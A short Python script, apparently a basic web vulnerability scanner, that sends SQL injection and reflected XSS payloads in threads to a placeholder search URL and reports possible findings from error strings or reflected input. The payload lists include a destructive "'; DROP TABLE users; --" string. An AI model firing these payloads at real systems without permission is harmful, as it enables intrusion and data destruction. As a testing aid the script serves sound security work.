import requests
import threading

sql_injection_payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]
xss_payloads = ["<script>alert('XSS')</script>", "\"><script>alert('XSS')</script>"]

def test_sql_injection(url, payload):
    response = requests.get(url, params={'q': payload})
    if "sql syntax" in response.text.lower() or "you have an error in your sql syntax" in response.text.lower():
        print(f"Possible SQL Injection vulnerability found with payload: {payload}")
    else:
        print(f"No SQL Injection vulnerability found with payload: {payload}")

def test_xss(url, payload):
    response = requests.get(url, params={'q': payload})
    if payload in response.text:
        print(f"Possible XSS vulnerability found with payload: {payload}")
    else:
        print(f"No XSS vulnerability found with payload: {payload}")

target_url = "http://example.com/search"

threads = []

print("Testing for SQL Injection...")
for payload in sql_injection_payloads:
    thread = threading.Thread(target=test_sql_injection, args=(target_url, payload))
    threads.append(thread)
    thread.start()

print("Testing for XSS...")
for payload in xss_payloads:
    thread = threading.Thread(target=test_xss, args=(target_url, payload))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
